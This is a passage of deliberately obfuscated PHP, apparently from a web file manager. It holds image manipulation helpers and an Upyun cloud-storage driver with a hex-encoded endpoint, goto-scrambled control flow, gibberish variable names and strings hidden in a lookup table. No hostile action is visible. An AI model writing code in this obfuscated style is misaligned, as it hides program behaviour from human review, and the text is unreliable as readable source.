$dæ†¡²µ“¸, $e¬ã”Şƒæ¥, $cÙ»°¿¬á, $d‰ÒäïŠ¯Ü, $b½Š½å§¹Ä, $b÷Ü¯¢ºÜ½, $dÂŠ¥ğ™È–, $dÌ±ÌĞÅ˜¿, $BÃ· ¹‚š„); } else { $fëµÈÎóÔÀ = ImageCreate($b÷Ü¯¢ºÜ½, $dÂŠ¥ğ™È–); imageCopyResized($fëµÈÎóÔÀ, $dæ†¡²µ“¸, $e¬ã”Şƒæ¥, $cÙ»°¿¬á, $d‰ÒäïŠ¯Ü, $b½Š½å§¹Ä, $b÷Ü¯¢ºÜ½, $dÂŠ¥ğ™È–, $dÌ±ÌĞÅ˜¿, $BÃ· ¹‚š„); } } else { $fëµÈÎóÔÀ = ImageCreate($b÷Ü¯¢ºÜ½, $dÂŠ¥ğ™È–); imageCopyResized($fëµÈÎóÔÀ, $dæ†¡²µ“¸, $e¬ã”Şƒæ¥, $cÙ»°¿¬á, $d‰ÒäïŠ¯Ü, $b½Š½å§¹Ä, $b÷Ü¯¢ºÜ½, $dÂŠ¥ğ™È–, $dÌ±ÌĞÅ˜¿, $BÃ· ¹‚š„); } return $fëµÈÎóÔÀ; } public function imgRotate($BÕëÁªî„¾, $dÒîìœªÀ“) { goto FÍˆ¥Ç¹¶; eí§šõ†¸: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $F“¨Å°è  = imagegif($DÈ¬§ğ¦ÀÀ, $BÕëÁªî„¾); break; case IMAGETYPE_JPEG: $F“¨Å°è  = imagejpeg($DÈ¬§ğ¦ÀÀ, $BÕëÁªî„¾, 100); break; case IMAGETYPE_PNG: $F“¨Å°è  = imagePNG($DÈ¬§ğ¦ÀÀ, $BÕëÁªî„¾); break; default: break; } imageDestroy($DÈ¬§ğ¦ÀÀ); imageDestroy($this->im); goto FåÓÁë’·µ; FÍˆ¥Ç¹¶: if (!$this->im || $dÒîìœªÀ“ % 360 === 0 || !function_exists($_SERVER[Î¿—”òá][1862])) { return !1; } $DÈ¬§ğ¦ÀÀ = imageRotate($this->im, 360 - $dÒîìœªÀ“, 0); $F“¨Å°è  = !1; goto eí§šõ†¸; FåÓÁë’·µ: return $F“¨Å°è ; goto CŒíŠÌ‘…„; CŒíŠÌ‘…„: } function echoImage($fÍÁ‚³ÈÍ†, $aŠ˜á²êö«) { goto c±ÜÙËì¿Â; e‰ÊÀ¤õä¨: imageDestroy($this->im); return $B¾¹‘‡Õ»·; goto Eà“ªƒ®ƒ“; c±ÜÙËì¿Â: $C¼²¬êêÃÖ =& $_SERVER[Î¿—”òá]; if (!$fÍÁ‚³ÈÍ†) { return !1; } ob_get_clean(); goto C†Â¨¢æ‰; C†Â¨¢æ‰: $B¾¹‘‡Õ»· = !1; switch ($this->echoType) { case $C¼²¬êêÃÖ[1863]: $B¾¹‘‡Õ»· = imagePNG($fÍÁ‚³ÈÍ†); break; case $C¼²¬êêÃÖ[167]: $B¾¹‘‡Õ»· = imagePNG($fÍÁ‚³ÈÍ†, $aŠ˜á²êö«); break; } imageDestroy($fÍÁ‚³ÈÍ†); goto e‰ÊÀ¤õä¨; Eà“ªƒ®ƒ“: } } if (!function_exists($_SERVER[Î¿—”òá][1864])) { define($_SERVER[Î¿—”òá][1865], 0); define($_SERVER[Î¿—”òá][1866], 1); define($_SERVER[Î¿—”òá][1867], 2); function imageflip($FÒƒÎ½óæÖ, $bÁ®®Œõ‹İ) { switch ($bÁ®®Œõ‹İ) { case IMG_FLIP_HORIZONTAL: $e÷óñ´¸Ë† = imagesx($FÒƒÎ½óæÖ) - 1; $a­İÕ½Æò® = $e÷óñ´¸Ë† / 2; $aáÅÖ¥© = imagesy($FÒƒÎ½óæÖ); $CÊ¹Í¸ƒĞ = imageistruecolor($FÒƒÎ½óæÖ) ? imagecreatetruecolor(1, $aáÅÖ¥©) : imagecreate(1, $aáÅÖ¥©); for ($FµÎÄÉ¥ìÙ = 0; $FµÎÄÉ¥ìÙ < $a­İÕ½Æò®; ++$FµÎÄÉ¥ìÙ) { imagecopy($CÊ¹Í¸ƒĞ, $FÒƒÎ½óæÖ, 0, 0, $FµÎÄÉ¥ìÙ, 0, 1, $aáÅÖ¥©); imagecopy($FÒƒÎ½óæÖ, $FÒƒÎ½óæÖ, $FµÎÄÉ¥ìÙ, 0, $e÷óñ´¸Ë† - $FµÎÄÉ¥ìÙ, 0, 1, $aáÅÖ¥©); imagecopy($FÒƒÎ½óæÖ, $CÊ¹Í¸ƒĞ, $e÷óñ´¸Ë† - $FµÎÄÉ¥ìÙ, 0, 0, 0, 1, $aáÅÖ¥©); } break; case IMG_FLIP_VERTICAL: $CñÖÖ‡åÕâ = imagesx($FÒƒÎ½óæÖ); $F’ùŠŠêœ¹ = imagesy($FÒƒÎ½óæÖ) - 1; $f½îÎæƒí¿ = $F’ùŠŠêœ¹ / 2; $CÊ¹Í¸ƒĞ = imageistruecolor($FÒƒÎ½óæÖ) ? imagecreatetruecolor($CñÖÖ‡åÕâ, 1) : imagecreate($CñÖÖ‡åÕâ, 1); for ($Fè‚‚¼¸‹Ù = 0; $Fè‚‚¼¸‹Ù < $f½îÎæƒí¿; ++$Fè‚‚¼¸‹Ù) { imagecopy($CÊ¹Í¸ƒĞ, $FÒƒÎ½óæÖ, 0, 0, 0, $Fè‚‚¼¸‹Ù, $CñÖÖ‡åÕâ, 1); imagecopy($FÒƒÎ½óæÖ, $FÒƒÎ½óæÖ, 0, $Fè‚‚¼¸‹Ù, 0, $F’ùŠŠêœ¹ - $Fè‚‚¼¸‹Ù, $CñÖÖ‡åÕâ, 1); imagecopy($FÒƒÎ½óæÖ, $CÊ¹Í¸ƒĞ, 0, $F’ùŠŠêœ¹ - $Fè‚‚¼¸‹Ù, 0, 0, $CñÖÖ‡åÕâ, 1); } break; case IMG_FLIP_BOTH: $CñÖÖ‡åÕâ = imagesx($FÒƒÎ½óæÖ); $aáÅÖ¥© = imagesy($FÒƒÎ½óæÖ); $CÊ¹Í¸ƒĞ = imagerotate($FÒƒÎ½óæÖ, 180, 0); imagecopy($FÒƒÎ½óæÖ, $CÊ¹Í¸ƒĞ, 0, 0, 0, 0, $CñÖÖ‡åÕâ, $aáÅÖ¥©); break; default: return; } imagedestroy($CÊ¹Í¸ƒĞ); } } goto EùÍ•çÆ£; FÊÔŸ‰Ü®¢: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\72\57\x2f\x76\60\56\x61\x70\x69\56\x75\160\x79\x75\156\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($a‹‹ÀÒĞÀ®) { parent::__construct(); $this->_init($a‹‹ÀÒĞÀ®); } public function _init($e»Ã¨×›°) { foreach ($e»Ã¨×›° as $bÉùòÉ¢ğ· => $f¼ÉÅÜî—¦) { if (isset($this->{$bÉùòÉ¢ğ·})) { $this->{$bÉùòÉ¢ğ·} = $f¼ÉÅÜî—¦; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Î¿—”òá][1234], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($e§·ê”‹¿…, $e‡ ³œÈˆ = "\107\x45\x54") { $Aïé×á¸— =& $_SERVER[Î¿—”òá]; $Dİâá³¬æ = gmdate($Aïé×á¸—[1198]); $f´¡Ú’İó = base64_encode(hash_hmac($Aïé×á¸—[1235], "{$e‡ ³œÈˆ}\46{$e§·ê”‹¿…}\x26{$Dİâá³¬æ}", md5("{$this->userpass}"), !0)); $B±Éª —É’ = array("\x41\165\x74\150\157\162\x69\172\x61\x74\x69\x6f\156\72\x55\x50\131\125\x4e\40{$this->username}\x3a{$f´¡Ú’İó}", "\x44\x61\164\x65\x3a{$Dİâá³¬æ}"); return $B±Éª —É’; } public function ussRequest($E¹” Ã¡ó¸, $bßÕÓà©ó = "\107\x45\x54", $A¬¿Š¿é§ª = false, $BæÔ­Æª’º = false, $A‚××½®«§ = false) { goto f±¸ª–Û¡×; f±¸ª–Û¡×: $b¡İßä´„Ï =& $_SERVER[Î¿—”òá]; $E¹” Ã¡ó¸ = trim($E¹” Ã¡ó¸, $b¡İßä´„Ï[8]); $c‡êÉÕø¬Ñ = "\57{$this->bucket}\57{$E¹” Ã¡ó¸}"; goto b¤ƒŸ­Íƒ; b¤ƒŸ­Íƒ: $cñÄĞÇè´ = $this->ussHeaders($c‡êÉÕø¬Ñ, $bßÕÓà©ó); if ($BæÔ­Æª’º) { $cñÄĞÇè´ = array_merge($cñÄĞÇè´, $BæÔ­Æª’º); } $b¢š½Ù”¥± = url_request($this->endpoint . $c‡êÉÕø¬Ñ, $bßÕÓà©ó, $A¬¿Š¿é§ª, $cñÄĞÇè´, $A‚××½®«§); goto e«œ‰ìòØ; e«œ‰ìòØ: if (!$b¢š½Ù”¥±) { return array($b¡İßä´„Ï[1025] => !1, $b¡İßä´„Ï[1027] => $b¡İßä´„Ï[1236]); } if (strtolower($bßÕÓà©ó) == $b¡İßä´„Ï[184] || in_array($b¢š½Ù”¥±[$b¡İßä´„Ï[1025]], array($b¡İßä´„Ï[1093], $b¡İßä´„Ï[1237]))) { $A¬¿Š¿é§ª = $b¢š½Ù”¥±[$b¡İßä´„Ï[1238]]; } else { $A¬¿Š¿é§ª = json_decode($b¢š½Ù”¥±[$b¡İßä´„Ï[1027]], !0); if (!$A¬¿Š¿é§ª) { $A¬¿Š¿é§ª = $b¢š½Ù”¥±[$b¡İßä´„Ï[1027]]; } else { if (!$b¢š½Ù”¥±[$b¡İßä´„Ï[685]] && isset($A¬¿Š¿é§ª[$b¡İßä´„Ï[1239]])) { $A¬¿Š¿é§ª = $A¬¿Š¿é§ª[$b¡İßä´„Ï[1239]]; } } } return array($b¡İßä´„Ï[1025] => $b¢š½Ù”¥±[$b¡İßä´„Ï[685]], $b¡İßä´„Ï[1027] => $A¬¿Š¿é§ª); goto dÕø­¨†ù; dÕø­¨†ù: } public function mkfile($aŠ¶ß“öÁ, $aÖÈİ®„¦ = '', $eĞÌòÀçÅ = REPEAT_RENAME) { if ($this->setContent($aŠ¶ß“öÁ, $aÖÈİ®„¦)) { return $this->getPathOuter($aŠ¶ß“öÁ); } return !1; } public function mkdir($FÙ®ÖÑÜÌÉ, $b‚ù¨ƒÆ²Ü = REPEAT_SKIP) { $f²¸Ã¢ä·± =& $_SERVER[Î¿—”òá]; $aŒ³¨ÚËì = trim($FÙ®ÖÑÜÌÉ, $f²¸Ã¢ä·±[8]); if ($this->_isFolder($aŒ³¨ÚËì)) { return $this->getPathOuter($aŒ³¨ÚËì); } $bÚæ‚º‘Ñê = array($f²¸Ã¢ä·±[1240]); $f•å¦í×‚• = $this->ussRequest($aŒ³¨ÚËì, $f²¸Ã¢ä·±[212], !1, $bÚæ‚º‘Ñê); return $f•å¦í×‚•[$f²¸Ã¢ä·±[1025]] ? $this->getPathOuter($aŒ³¨ÚËì) : !1; } public function copyFile($E¦µÔÜ’, $Fç«¹¸àò¢) { $eëëÜ÷›°Š =& $_SERVER[Î¿—”òá]; $b„¢“œà¢É = array($eëëÜ÷›°Š[1241] . "\x2f{$this->bucket}\57{$E¦µÔÜ’}", $eëëÜ÷›°Š[1242]); $cÆÑ×ø·È¦ = $this->ussRequest($Fç«¹¸àò¢, $eëëÜ÷›°Š[214], !1, $b„¢“œà¢É); return $cÆÑ×ø·È¦[$eëëÜ÷›°Š[1025]] ? !0 : $this->getPathOuter($Fç«¹¸àò¢); } public function moveFile($EÖß‰¦Ôò’, $B Ë£ĞÙÉÔ) { $eÏå‚’Ûß² =& $_SERVER[Î¿—”òá]; $E¦Œå†‚ó = array($eÏå‚’Ûß²[1243] . "\57{$this->bucket}\x2f{$EÖß‰¦Ôò’}", $eÏå‚’Ûß²[1242]); $f±áó‹Æ˜ª = $this->ussRequest($B Ë£ĞÙÉÔ, $eÏå‚’Ûß²[214], !1, $E¦Œå†‚ó); return $f±áó‹Æ˜ª[$eÏå‚’Ûß²[1025]] ? !0 : $this->getPathOuter($B Ë£ĞÙÉÔ); } public function delFile($dÜ–Âˆõæõ) { $CËâ¡ÖÉòÄ =& $_SERVER[Î¿—”òá]; $A±©†½…‚š = $this->ussRequest($dÜ–Âˆõæõ, $CËâ¡ÖÉòÄ[1244]); return $A±©†½…‚š[$CËâ¡ÖÉòÄ[1025]] ? !0 : !1; } public function delFolder($eš…Œö©Ô) { $AÀÓòó¯à =& $_SERVER[Î¿—”òá]; $aíÏï‡„ÀÄ = $this->listAll($eš…Œö©Ô); krsort($aíÏï‡„ÀÄ); foreach ($aíÏï‡„ÀÄ as $d· è•°Ïõ) { $this->ussRequest($d· è•°Ïõ[$AÀÓòó¯à[75]], $AÀÓòó¯à[1244]); } return $this->ussRequest($eš…Œö©Ô, $AÀÓòó¯à[1244]); } public function rename($BŠ«Ó»´’«, $a¶ê¥ô”¸) { if ($this->isFile($BŠ«Ó»´’«)) { $a¶ê¥ô”¸ = get_path_father($BŠ«Ó»´’«) . $a¶ê¥ô”¸; return $this->moveFile($BŠ«Ó»´’«, $a¶ê¥ô”¸); } return $this->renameObject($BŠ«Ó»´’«, $a¶ê¥ô”¸); } public function fileInfo($DÑ¢ÉøÈË–, $D×±›¤¤ë = false, $CçâõˆÇ°‡ = array()) { $e²í©×î– =& $_SERVER[Î¿—”òá]; if ($D×±›¤¤ë) { return array($e²í©×î–[28] => $this->pathThis($DÑ¢ÉøÈË–), $e²í©×î–[75] => $this->getPathOuter($e²í©×î–[8] . $DÑ¢ÉøÈË–), $e²í©×î–[29] => $e²í©×î–[167], $e²í©×î–[77] => isset($CçâõˆÇ°‡[$e²í©×î–[325]]) ? $CçâõˆÇ°‡[$e²í©×î–[325]] : 0, $e²í©×î–[160] => $this->ext($DÑ¢ÉøÈË–)); } $Aíõ¤¾™© = array($e²í©×î–[28] => $this->pathThis($DÑ¢ÉøÈË–), $e²í©×î–[75] => $this->getPathOuter($e²í©×î–[8] . $DÑ¢ÉøÈË–), $e²í©×î–[29] => $e²í©×î–[167], $e²í©×î–[187] => 0, $e²í©×î–[107] => isset($f¦˜øòÔ³«[$e²í©×î–[1245]]) ? $f¦˜øòÔ³«[$e²í©×î–[1245]] : 0, $e²í©×î–[77] => isset($CçâõˆÇ°‡[$e²í©×î–[325]]) ? $CçâõˆÇ°‡[$e²í©×î–[325]] : 0, $e²í©×î–[160] => $this->ext($DÑ¢ÉøÈË–), $e²í©×î–[188] => !0, $e²í©×î–[189] => !0); if (empty($CçâõˆÇ°‡)) { $CçâõˆÇ°‡ = $this->objectMeta($DÑ¢ÉøÈË–); if (!$CçâõˆÇ°‡) { return $Aíõ¤¾™©; } $Aíõ¤¾™©[$e²í©×î–[187]] = $CçâõˆÇ°‡[$e²í©×î–[1246]]; $Aíõ¤¾™©[$e²í©×î–[107]] = $CçâõˆÇ°‡[$e²í©×î–[1247]]; $Aíõ¤¾™©[$e²í©×î–[77]] = $CçâõˆÇ°‡[$e²í©×î–[77]]; } return $Aíõ¤¾™©; } public function folderInfo($C……®‘¾, $fòÃ¬¼ÁÁò = false) { $BÈ÷ôò°Åõ =& $_SERVER[Î¿—”òá]; if ($fòÃ¬¼ÁÁò) { return array($BÈ÷ôò°Åõ[28] => $this->pathThis($C……®‘¾), $BÈ÷ôò°Åõ[75] => $this->getPathOuter($BÈ÷ôò°Åõ[8] . $C……®‘¾), $BÈ÷ôò°Åõ[29] => $BÈ÷ôò°Åõ[76]); } $C¿ó¸Ò´ğ… = array($BÈ÷ôò°Åõ[28] => $this->pathThis($C……®‘¾), $BÈ÷ôò°Åõ[75] => $this->getPathOuter($BÈ÷ôò°Åõ[8] . $C……®‘¾), $BÈ÷ôò°Åõ[29] => $BÈ÷ôò°Åõ[76], $BÈ÷ôò°Åõ[187] => 0, $BÈ÷ôò°Åõ[107] => isset($d•Ô˜éâÅø[$BÈ÷ôò°Åõ[1245]]) ? $d•Ô˜éâÅø[$BÈ÷ôò°Åõ[1245]] : 0, $BÈ÷ôò°Åõ[1155] => !0, $BÈ÷ôò°Åõ[1156] => !0); if (empty($E‘Íâ®±Í’)) { $E‘Íâ®±Í’ = $this->objectMeta($C……®‘¾); if (!$E‘Íâ®±Í’) { return $C¿ó¸Ò´ğ…; } $C¿ó¸Ò´ğ…[$BÈ÷ôò°Åõ[187]] = $E‘Íâ®±Í’[$BÈ÷ôò°Åõ[1246]]; $C¿ó¸Ò´ğ…[$BÈ÷ôò°Åõ[107]] = $E‘Íâ®±Í’[$BÈ÷ôò°Åõ[1247]]; } return $C¿ó¸Ò´ğ…; } private function fileList($b˜Äé¬„“á, $Aì¡Ø¾é = 0, $BÛ­Íõ‚© = 1000) { $aÍ†ŸÂÀá =& $_SERVER[Î¿—”òá]; $cÊ­ßœÊäŠ = array($aÍ†ŸÂÀá[1248], $aÍ†ŸÂÀá[1249] . $BÛ­Íõ‚©); if ($Aì¡Ø¾é) { $cÊ­ßœÊäŠ[] = $aÍ†ŸÂÀá[1250] . $Aì¡Ø¾é; } $DÊéæÑ¶ = $this->ussRequest($b˜Äé¬„“á, $aÍ†ŸÂÀá[216], !1, $cÊ­ßœÊäŠ); return !$DÊéæÑ¶[$aÍ†ŸÂÀá[1025]] ? !1 : $DÊéæÑ¶[$aÍ†ŸÂÀá[1027]]; } public function listPath($cè¿‘Ê’İŒ, $eÏš”¹—Ó = false) { goto a‘ß¬¼²; B À¿’Á„: $a“‘§–‹Ş½ = $E¡é°öö§¹ = array(); $cŞğù¶Ïø = rtrim($cè¿‘Ê’İŒ, $c½ˆ×Ú§Ò‹[8]) . $c½ˆ×Ú§Ò‹[8]; while (!0) { $BÁ¯Œˆêî¥ = $this->fileList($cè¿‘Ê’İŒ, $F¯‡ŞÀ¸ÑÄ, $Bª†‰Ğ—±Æ); if (!$BÁ¯Œˆêî¥) { return !1; } $F¯‡ŞÀ¸ÑÄ = isset($BÁ¯Œˆêî¥[$c½ˆ×Ú§Ò‹[1251]]) ? $BÁ¯Œˆêî¥[$c½ˆ×Ú§Ò‹[1251]] : $c½ˆ×Ú§Ò‹[33]; $eâ¿šĞÎà’ = isset($BÁ¯Œˆêî¥[$c½ˆ×Ú§Ò‹[1252]]) ? $BÁ¯Œˆêî¥[$c½ˆ×Ú§Ò‹[1252]] : array(); foreach ($eâ¿šĞÎà’ as $f‡‡’½…”Õ) { if ($f‡‡’½…”Õ[$c½ˆ×Ú§Ò‹[29]] == $c½ˆ×Ú§Ò‹[76]) { $a“‘§–‹Ş½[] = $this->folderInfo($cŞğù¶Ïø . $f‡‡’½…”Õ[$c½ˆ×Ú§Ò‹[28]], $eÏš”¹—Ó, $f‡‡’½…”Õ); } else { $E¡é°öö§¹[] = $this->fileInfo($cŞğù¶Ïø . $f‡‡’½…”Õ[$c½ˆ×Ú§Ò‹[28]], $eÏš”¹—Ó, $f‡‡’½…”Õ); } } if (count($eâ¿šĞÎà’) < $Bª†‰Ğ—±Æ) { break; } } goto a±¬§îÕ; a±¬§îÕ: return array($c½ˆ×Ú§Ò‹[74] => $a“‘§–‹Ş½, $c½ˆ×Ú§Ò‹[73] => $E¡é°öö§¹); goto d¡™»èÛœŠ; a‘ß¬¼²: $c½ˆ×Ú§Ò‹ =& $_SERVER[Î¿—”òá]; $F¯‡ŞÀ¸ÑÄ = $c½ˆ×Ú§Ò‹[33]; $Bª†‰Ğ—±Æ = 1000; goto B À¿’Á„; d¡™»èÛœŠ: } private function recursionAllFiles($Aù‚ÏñÓÓ, &$cß¿ëõøÃ’) { $fˆ˜ªÚØ´ø =& $_SERVER[Î¿—”òá]; $F¤³‡ÃÈµš = $fˆ˜ªÚØ´ø[33]; $bÀĞÍ¿´ = 1000; $cêöÁÖè‡ï = $C–‡ ¥¯¯ˆ = array(); $BÓˆÂ—’§‹ = rtrim($Aù‚ÏñÓÓ, $fˆ˜ªÚØ´ø[8]) . $fˆ˜ªÚØ´ø[8]; while (!0) { $BÛ°ªÚ”“é = $this->fileList($Aù‚ÏñÓÓ, $F¤³‡ÃÈµš, $bÀĞÍ¿´); if (!$BÛ°ªÚ”“é) { return !1; } $F¤³‡ÃÈµš = isset($BÛ°ªÚ”“é[$fˆ˜ªÚØ´ø[1251]]) ? $BÛ°ªÚ”“é[$fˆ˜ªÚØ´ø[1251]] : $fˆ˜ªÚØ´ø[33]; $A±‰‡¼²ŒÓ = isset($BÛ°ªÚ”“é[$fˆ˜ªÚØ´ø[1252]]) ? $BÛ°ªÚ”“é[$fˆ˜ªÚØ´ø[1252]] : array(); foreach ($A±‰‡¼²ŒÓ as $aİ÷ ¬Á™Ú) { $fù¡ùØ­¼È = array($fˆ˜ªÚØ´ø[75] => $BÓˆÂ—’§‹ . $aİ÷ ¬Á™Ú[$fˆ˜ªÚØ´ø[28]], $fˆ˜ªÚØ´ø[76] => $aİ÷ ¬Á™Ú[$fˆ˜ªÚØ´ø[29]] == $fˆ˜ªÚØ´ø[76] ? 1 : 0, $fˆ˜ªÚØ´ø[77] => isset($aİ÷ ¬Á™Ú[$fˆ˜ªÚØ´ø[325]]) ? $aİ÷ ¬Á™Ú[$fˆ˜ªÚØ´ø[325]] : 0); $cß¿ëõøÃ’[] = $fù¡ùØ­¼È; if ($fù¡ùØ­¼È[$fˆ˜ªÚØ´ø[76]] == 1) { $this->recursionAllFiles($fù¡ùØ­¼È[$fˆ˜ªÚØ´ø[75]], $cß¿ëõøÃ’); } } if (count($A±‰‡¼²ŒÓ) < $bÀĞÍ¿´) { break; } } } public function has($e¿“ÂÎ°§, $eÈ˜¿“‘ËÜ = false, $BÓ†ö•âà = true) { goto DÍÈ¤§©§×; e—Œâ•§â: while (!0) { $e»„»Œİµì = $this->fileList($e¿“ÂÎ°§, $AŞâ…ÃÉë£, $b™ß¤µæò); if (!$e»„»Œİµì) { return !1; } $AŞâ…ÃÉë£ = isset($e»„»Œİµì[$FŞ˜¿‡µà[1251]]) ? $e»„»Œİµì[$FŞ˜¿‡µà[1251]] : $FŞ˜¿‡µà[33]; $eŒ“°˜‡Ñ = isset($e»„»Œİµì[$FŞ˜¿‡µà[1252]]) ? $e»„»Œİµì[$FŞ˜¿‡µà[1252]] : array(); if (empty($eŒ“°˜‡Ñ)) { break; } $f²Ò´³µå® = array_to_keyvalue($eŒ“°˜‡Ñ, $FŞ˜¿‡µà[33], $FŞ˜¿‡µà[29]); $D±ß·í÷áË = array_count_values($f²Ò´³µå®); $C²¤¡Áİ  = isset($D±ß·í÷áË[$FŞ˜¿‡µà[76]]) ? $D±ß·í÷áË[$FŞ˜¿‡µà[76]] : 0; $CäÓÈÍÖÛé = count($f²Ò´³µå®) - $C²¤¡Áİ ; if ($eÈ˜¿“‘ËÜ) { $fõ§˜ì—é¾ += $C²¤¡Áİ ; $F÷Ñ²áŸ¤õ += $CäÓÈÍÖÛé; if ($fĞæğù¨âÊ < $b™ß¤µæò) { break; } continue; } if ($BÓ†ö•âà) { if ($CäÓÈÍÖÛé) { return !0; } } else { if ($C²¤¡Áİ ) { return !0; } } if (count($eŒ“°˜‡Ñ) < $b™ß¤µæò) { break; } } if ($eÈ˜¿“‘ËÜ) { return array($FŞ˜¿‡µà[191] => $F÷Ñ²áŸ¤õ, $FŞ˜¿‡µà[192] => $fõ§˜ì—é¾); } return !1; goto a¸éÏ¿‘ì; f¡¤ÆØ…Ë²: $F÷Ñ²áŸ¤õ = 0; $fõ§˜ì—é¾ = 0; $f¡í†ò¢ÃÜ = rtrim($e¿“ÂÎ°§, $FŞ˜¿‡µà[8]) . $FŞ˜¿‡µà[8]; goto e—Œâ•§â; DÍÈ¤§©§×: $FŞ˜¿‡µà =& $_SERVER[Î¿—”òá]; $AŞâ…ÃÉë£ = $FŞ˜¿‡µà[33]; $b™ß¤µæò = 1000; goto f¡¤ÆØ…Ë²; a¸éÏ¿‘ì: } public function listAll($D¤„Àó£™¤) { $dœØ”¥š’º = array(); $this->recursionAllFiles($D¤„Àó£™¤, $dœØ”¥š’º); return $dœØ”¥š’º; } public function canRead($bÍ¸­‘Ñ®î) { return $this->exist($bÍ¸­‘Ñ®î) ? !0 : !1; } public function canWrite($aÉ°¿Ú©ÀÀ) { return $this->exist($aÉ°¿Ú©ÀÀ) ? !0 : !1; } public function getContent($bß¾¢”Ë ª) { return $this->fileSubstr($bß¾¢”Ë ª, 0, -1); } public function setContent($BÇÖ¬ïÈ°š, $a“«•ŒÆ† = '') { $c‘© á°‚® =& $_SERVER[Î¿—”òá]; if (!$a“«•ŒÆ†) { $D¤Ÿ—ä¤•‰ = $this->ussRequest($BÇÖ¬ïÈ°š, $c‘© á°‚®[212]); return $D¤Ÿ—ä¤•‰[$c‘© á°‚®[1025]]; } $D†°„»ãì = $this->tempFile($this->pathThis($BÇÖ¬ïÈ°š)); file_put_contents($D†°„»ãì, $a“«•ŒÆ†); if ($this->upload($BÇÖ¬ïÈ°š, $D†°„»ãì)) { $this->tempFileRemve($D†°„»ãì); return !0; } return !1; } public function fileSubstr($f ›¤‹¾‚·, $d®öô©Å¿, $d™–ìÓÓŞ¸) { $FÖÁÌ‘Œé§ =& $_SERVER[Î¿—”òá]; if (!($eµíÙ½Ä  = $this->link($f ›¤‹¾‚·))) { return !1; } $c¦õ§°øÂà = !1; if ($d™–ìÓÓŞ¸ > 0) { $Aóê¸Á²Û˜ = $d®öô©Å¿ + $d™–ìÓÓŞ¸ - 1; $c¦õ§°øÂà = array($FÖÁÌ‘Œé§[1213] . $d®öô©Å¿ . $FÖÁÌ‘Œé§[412] . $Aóê¸Á²Û˜); } $CËæ’ÕÂ°í = url_request($eµíÙ½Ä , $FÖÁÌ‘Œé§[216], !1, $c¦õ§°øÂà); return $CËæ’ÕÂ°í[$FÖÁÌ‘Œé§[685]] ? $CËæ’ÕÂ°í[$FÖÁÌ‘Œé§[1027]] : !1; } public function upload($a×ÊÆ³‚, $a¸åÔéÛ†, $bÉÌïÍ¤Ÿ = false, $BÅˆ ªÀšÈ = REPEAT_REPLACE) { goto eÀµ——¿¯Õ; eÀµ——¿¯Õ: $C‘¼©ñÓ†® =& $_SERVER[Î¿—”òá]; $f”šŒ¿ö¢º = IO::size($a¸åÔéÛ†); if ($f”šŒ¿ö¢º <= 1024 * 1024 * 200) { $D®Š¤ˆÚß = array($C‘¼©ñÓ†®[1253] . $a¸åÔéÛ†); $a²À—Ä‘ = $this->ussRequest($a×ÊÆ³‚, $C‘¼©ñÓ†®[214], $D®Š¤ˆÚß); return $a²À—Ä‘[$C‘¼©ñÓ†®[1025]] ? $this->getPathOuter($a×ÊÆ³‚) : !1; } goto EÂªçÎäñ´; F­‰¬íÔã: $b³·ÚÚ¾‰ = $b„°ğô‹–À[$C‘¼©ñÓ†®[1258]]; $fëáö¦«¨ = fopen($a¸åÔéÛ†, $C‘¼©ñÓ†®[1163]); if (!$fëáö¦«¨) { return !1; } goto bíÔÑæêÀß; E·¦¤ª¤¹÷: $a²À—Ä‘ = $this->ussRequest($a×ÊÆ³‚, $C‘¼©ñÓ†®[214], !1, $CÃÙˆ­–ë‡); return $a²À—Ä‘[$C‘¼©ñÓ†®[1025]] ? $this->getPathOuter($bš„´ã‡°) : !1; goto d‹ğÄãœ; EÂªçÎäñ´: $CÕÊÀéÏôŞ = 1024 * 1024 * 10; $CÃÙˆ­–ë‡ = array($C‘¼©ñÓ†®[1254], $C‘¼©ñÓ†®[1255] . $f”šŒ¿ö¢º, $C‘¼©ñÓ†®[1256], $C‘¼©ñÓ†®[1257] . $CÕÊÀéÏôŞ); $a²À—Ä‘ = $this->ussRequest($a×ÊÆ³‚, $C‘¼©ñÓ†®[214], !1, $CÃÙˆ­–ë‡); goto eˆŠ»ç‡‰; eˆŠ»ç‡‰: if (!$a²À—Ä‘[$C‘¼©ñÓ†®[1025]]) { return !1; } $b„°ğô‹–À = $a²À—Ä‘[$C‘¼©ñÓ†®[1027]]; $f‡ŒØä¦ğ = 0; goto F­‰¬íÔã; bíÔÑæêÀß: do { $B¸Ş¬Ô…šÑ = $b„°ğô‹–À[$C‘¼©ñÓ†®[1259]]; fseek($fëáö¦«¨, $f‡ŒØä¦ğ); $E¥„¤ÇÛ·‡ = fread($fëáö¦«¨, $B¸Ş¬Ô…šÑ); $c†ñ­òš ± = 0; do { $c†ñ­òš ±++; $b„°ğô‹–À = $this->uploadPart($a×ÊÆ³‚, $b„°ğô‹–À, $E¥„¤ÇÛ·‡); } while (!$b„°ğô‹–À && $c†ñ­òš ± < 3); if (!$b„°ğô‹–À) { return !1; } $b³·ÚÚ¾‰ = $b„°ğô‹–À[$C‘¼©ñÓ†®[1258]]; $f‡ŒØä¦ğ += $B¸Ş¬Ô…šÑ; } while ($b³·ÚÚ¾‰ != -1); fclose($fëáö¦«¨); $CÃÙˆ­–ë‡ = array($C‘¼©ñÓ†®[1260], $C‘¼©ñÓ†®[1261] . $b„°ğô‹–À[$C‘¼©ñÓ†®[1262]], $C‘¼©ñÓ†®[1256]); goto E·¦¤ª¤¹÷; d‹ğÄãœ: } private function uploadPart($FèêõÌÕšÈ, $AİÅ‘¸¤ß, &$còÚ¢šøœ) { $c™ÄÕù½†“ =& $_SERVER[Î¿—”òá]; $c¬¡¥ßŠèŒ = array($c™ÄÕù½†“[1263], $c™ÄÕù½†“[1261] . $AİÅ‘¸¤ß[$c™ÄÕù½†“[1262]], $c™ÄÕù½†“[1264] . $AİÅ‘¸¤ß[$c™ÄÕù½†“[1258]], $c™ÄÕù½†“[138] . $AİÅ‘¸¤ß[$c™ÄÕù½†“[1259]]); $b‚ÏËÏ²‘ = $this->ussRequest($FèêõÌÕšÈ, $c™ÄÕù½†“[214], $còÚ¢šøœ, 